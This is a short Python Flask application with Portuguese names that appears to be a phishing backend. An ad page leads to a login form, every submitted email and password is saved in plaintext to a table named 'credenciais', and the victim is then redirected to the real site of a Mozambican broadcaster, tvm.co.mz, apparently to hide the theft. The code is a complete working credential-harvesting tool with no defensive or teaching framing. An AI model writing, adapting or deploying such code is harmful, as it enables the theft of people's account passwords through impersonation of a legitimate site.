from flask import Flask, render_template, request, redirect, url_for
import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credenciais (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            senha TEXT NOT NULL,
            contato TEXT
        )
    ''')
    conn.commit()
    conn.close()

def salvar_credenciais(email, senha, contato):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO credenciais (email, senha, contato) VALUES (?, ?, ?)", (email, senha, contato))
    conn.commit()
    conn.close()

@app.route('/')
def anuncio():
    return render_template('anuncio.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        senha = request.form['senha']
        contato = request.form.get('contato', '')  # contato opcional
        salvar_credenciais(email, senha, contato)
        return redirect(url_for('sucesso'))
    return render_template('login.html')

@app.route('/sucesso')
def sucesso():
    site_original = "https://www.tvm.co.mz/"
    return render_template('sucesso.html', site_url=site_original)

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
